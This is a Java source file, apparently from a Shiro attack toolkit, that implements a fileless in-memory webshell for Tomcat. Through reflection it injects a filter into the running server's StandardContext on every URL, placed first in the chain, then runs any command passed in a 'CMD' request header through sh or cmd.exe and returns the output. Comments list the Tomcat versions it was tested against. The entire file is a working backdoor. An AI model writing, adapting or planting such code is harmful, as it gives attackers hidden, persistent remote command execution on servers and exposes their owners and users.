package org.shiroattack;

import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Map;
import java.util.Scanner;
import javax.servlet.DispatcherType;
import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;


// 成功: Tomcat 7.0.10、7.0.109、8.5.54、9.0.10、9.0.70
// 失败: Tomcat 7.0.0、10.0.0
public class FilterMemShell implements Filter {
    public HttpServletRequest request = null;
    public HttpServletResponse response = null;

    public boolean equals(Object obj) {
        this.getReqResp(obj);
        StringBuffer output = new StringBuffer();

        try {
            this.response.setContentType("text/html");
            this.request.setCharacterEncoding("UTF-8");
            this.response.setCharacterEncoding("UTF-8");
            output.append(this.addFilter());
        } catch (Exception e) {
            output.append("error:" + e.toString());
        }

        try {
            this.response.getWriter().print(output.toString());
            this.response.getWriter().flush();
            this.response.getWriter().close();
        } catch (Exception e) {
        }

        return true;
    }

    public String addFilter() throws Exception {
        ServletContext servletContext = this.request.getServletContext();
        Filter filter = this;
        final String filterName = "F!lter"+System.nanoTime()%100000L;

        org.apache.catalina.core.StandardContext standardContext = null;
        String msg;

        try {
            Field contextField = servletContext.getClass().getDeclaredField("context");
            contextField.setAccessible(true);

            org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext);
            contextField = applicationContext.getClass().getDeclaredField("context");
            contextField.setAccessible(true);

            standardContext = (org.apache.catalina.core.StandardContext) contextField.get(applicationContext);


            Field filterConfigsfield = standardContext.getClass().getDeclaredField("filterConfigs");
            filterConfigsfield.setAccessible(true);
            Map map = (Map) filterConfigsfield.get(standardContext);

            if(map.get(filterName) == null) {
                // 获取 FilterDef，兼容Tomcat 7和8
                Class filterDefClass = null;
                try{
                    // 8
                    filterDefClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
                }catch(Exception e){
                    // 7
                    filterDefClass = Class.forName("org.apache.catalina.deploy.FilterDef");
                }

                Object filterDef = filterDefClass.newInstance();
                filterDef.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterDef, new Object[]{filterName});

                filterDef.getClass().getDeclaredMethod("setFilterClass", new Class[]{String.class}).invoke(filterDef, new Object[]{filter.getClass().getName()});
                filterDef.getClass().getDeclaredMethod("setFilter", new Class[]{Filter.class}).invoke(filterDef, new Object[]{filter});
                standardContext.getClass().getDeclaredMethod("addFilterDef", new Class[]{filterDefClass}).invoke(standardContext, new Object[]{filterDef});


                // 获取 FilterMap，，兼容Tomcat 7和8
                Class filterMapClass = null;
                try {
                    // Tomcat 8
                    filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                } catch (Exception e) {
                    // Tomcat 7
                    filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
                }

                Object filterMap = filterMapClass.newInstance();
                filterMap.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterMap, new Object[]{filterName});
                filterMap.getClass().getDeclaredMethod("setDispatcher", new Class[]{String.class}).invoke(filterMap, new Object[]{DispatcherType.REQUEST.name()});
                filterMap.getClass().getDeclaredMethod("addURLPattern",
                        new Class[]{String.class}).invoke(filterMap, new Object[]{"/*"});

                //调用 addFilterMapBefore 会自动加到队列的最前面，不需要原来的手工去调整顺序了
                standardContext.getClass().getDeclaredMethod("addFilterMapBefore", new Class[]{filterMapClass}).invoke(standardContext, new Object[]{filterMap});

                //设置 FilterConfig
                Constructor constructor = org.apache.catalina.core.ApplicationFilterConfig.class.getDeclaredConstructor(new Class[]{org.apache.catalina.Context.class, filterDefClass});
                constructor.setAccessible(true);
                org.apache.catalina.core.ApplicationFilterConfig filterConfig = null;
                try {
                    filterConfig = (org.apache.catalina.core.ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
                } catch (Exception e) {
                    e.printStackTrace();
                    return getStackTrace(e);
                }

                map.put(filterName, filterConfig);
            }

        } catch (Exception e) {
            e.printStackTrace();
            return getStackTrace(e);
        }
        return filterName+" has been successfully added :)";
    }

    public static String getStackTrace(Throwable throwable) {
        java.io.StringWriter sw = new java.io.StringWriter();
        java.io.PrintWriter pw = new java.io.PrintWriter(sw);

        try {
            throwable.printStackTrace(pw);
            return sw.toString();
        } finally {
            pw.close();
        }
    }

    // 多种方式，获取request与response
    public void getReqResp(Object obj) {
        if (obj.getClass().isArray()) {
            Object[] data = (Object[]) ((Object[])((Object[])obj));
            this.request = (HttpServletRequest) data[0];
            this.response = (HttpServletResponse) data[1];
        } else {
            try {
                Class pageContext = Class.forName("javax.servlet.jsp.PageContext");
                this.request = (HttpServletRequest) pageContext.getDeclaredMethod("getRequest").invoke(obj);
                this.response = (HttpServletResponse) pageContext.getDeclaredMethod("getResponse").invoke(obj);
            } catch (Exception e) {
                if (obj instanceof HttpServletRequest) {
                    this.request = (HttpServletRequest) obj;

                    try {
                        Field reqField = this.request.getClass().getDeclaredField("request");
                        reqField.setAccessible(true);
                        HttpServletRequest request2 = (HttpServletRequest) reqField.get(this.request);
                        Field respField = request2.getClass().getDeclaredField("response");
                        respField.setAccessible(true);
                        this.response = (HttpServletResponse) respField.get(request2);
                    } catch (Exception ex) {
                        try {
                            this.response = (HttpServletResponse) this.request.getClass().getDeclaredMethod("getResponse").invoke(obj);
                        } catch (Exception exc) {
                        }
                    }
                }
            }
        }
    }

    public void init(FilterConfig filterConfig) throws ServletException {
    }

    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest)req;
        HttpServletResponse response = (HttpServletResponse)resp;
        String cmd = request.getHeader("CMD");
        String osTyp;
        if (cmd != null && !cmd.isEmpty()) {
            boolean isLinux = true;
            osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }

            String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = (new Scanner(in)).useDelimiter("\\a");
            String output = s.hasNext() ? s.next() : "";
            PrintWriter out = response.getWriter();
            out.println(output);
            out.flush();
            out.close();
        } else {
            chain.doFilter(req, resp);
        }
    }

    public void destroy() {
    }
}